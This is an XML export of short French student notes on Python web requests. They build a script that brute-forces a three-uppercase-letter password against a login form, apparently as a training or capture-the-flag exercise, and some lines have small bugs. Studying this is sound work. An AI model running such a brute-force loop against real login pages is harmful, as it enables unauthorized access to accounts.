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quête WEB python :</text:p>
      <text:p text:style-name="Standard"/>
      <text:p text:style-name="Standard">importer le module requests</text:p>
      <text:p text:style-name="Standard"/>
      <text:p text:style-name="P1">x = requests.get(#adresse du site)</text:p>
      <text:p text:style-name="P1">print(« code http : », x.status_code)</text:p>
      <text:p text:style-name="P1">print(x.code)</text:p>
      <text:p text:style-name="Standard"/>
      <text:p text:style-name="Standard">ce bout de code renvoie le code source de la page</text:p>
      <text:p text:style-name="Standard"/>
      <text:p text:style-name="P1">champs = {'email' : 'admin', 'password' : 'PHT'}</text:p>
      <text:p text:style-name="P1">x = requests.post(#adresse du site, data = champs) → penser à mettre l'action du formulaire</text:p>
      <text:p text:style-name="P1">print(« code http : », x.status_code)</text:p>
      <text:p text:style-name="P1">print(x.code)</text:p>
      <text:p text:style-name="P1"/>
      <text:p text:style-name="P2">Pour tester le mdp</text:p>
      <text:p text:style-name="P2"/>
      <text:p text:style-name="P1">import string</text:p>
      <text:p text:style-name="P1">print(string.ascii_uppercase)</text:p>
      <text:p text:style-name="P2"/>
      <text:p text:style-name="P2">Alphabet en majascules</text:p>
      <text:p text:style-name="P2"/>
      <text:p text:style-name="P1">for l1 in string.ascii_uppercase :</text:p>
      <text:p text:style-name="P1"><text:tab/>for l2 in string.ascii_uppercase :</text:p>
      <text:p text:style-name="P1"><text:tab/><text:tab/>for l3 in string.ascii_uppercase :</text:p>
      <text:p text:style-name="P1"><text:tab/><text:tab/><text:tab/>print(l1 + l2 + l3)</text:p>
      <text:p text:style-name="P2"/>
      <text:p text:style-name="P2">Affiche toutes les combinaisons (ici tout les mdp sont fait de 3 caractères en maj)</text:p>
      <text:p text:style-name="P2"/>
      <text:p text:style-name="P1">import string, request</text:p>
      <text:p text:style-name="P2"/>
      <text:p text:style-name="P1">for l1 in string.ascii_uppercase :</text:p>
      <text:p text:style-name="P1"><text:tab/>for l2 in string.ascii_uppercase :</text:p>
      <text:p text:style-name="P1"><text:tab/><text:tab/>for l3 in string.ascii_uppercase :</text:p>
      <text:p text:style-name="P1"><text:tab/><text:tab/><text:tab/>champs = {'email' : 'admin@example.com', 'password' : l1 + l2 + l3}</text:p>
      <text:p text:style-name="P2"><text:tab/><text:tab/><text:tab/><text:span text:style-name="T1">x = requests.post(#adresse du site, data = champs)</text:span></text:p>
      <text:p text:style-name="P2"><text:span text:style-name="T1"/></text:p>
      <text:p text:style-name="P2"><text:span text:style-name="T1"><text:tab/><text:tab/><text:tab/>if not « Flop-Security – Login form in x.text :</text:span></text:p>
      <text:p text:style-name="P2"><text:span text:style-name="T1"><text:tab/><text:tab/><text:tab/><text:tab/>print(« Mdp trouvé »)</text:span></text:p>
      <text:p text:style-name="P2"><text:span text:style-name="T1"><text:tab/><text:tab/><text:tab/><text:tab/>sys.exit(0)</text:span></text:p>
      <text:p text:style-name="P2"><text:span text:style-name="T1"/></text:p>
      <text:p text:style-name="P2">Algo final</text:p>
      <text:p text:style-name="P2"><text:span text:style-name="T1"/></text:p>
      <text:p text:style-name="P2"><text:span text:style-name="T1"/></text:p>
      <text:p text:style-name="P2"/>
      <text:p text:style-name="P2"/>
      <text:p text:style-name="P2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1-12-22T15:52:52</meta:creation-date>
    <meta:document-statistic meta:table-count="0" meta:image-count="0" meta:object-count="0" meta:page-count="1" meta:paragraph-count="29" meta:word-count="161" meta:character-count="1011"/>
    <dc:date>2021-12-22T16:41:03</dc:date>
    <dc:creator>Jordan </dc:creator>
    <meta:editing-duration>PT2M20S</meta:editing-duration>
    <meta:editing-cycles>1</meta:editing-cycles>
    <meta:generator>OpenOffice/4.1.7$Unix OpenOffice.org_project/417m1$Build-9800</meta:generator>
  </office:meta>
</office:document-meta>
</file>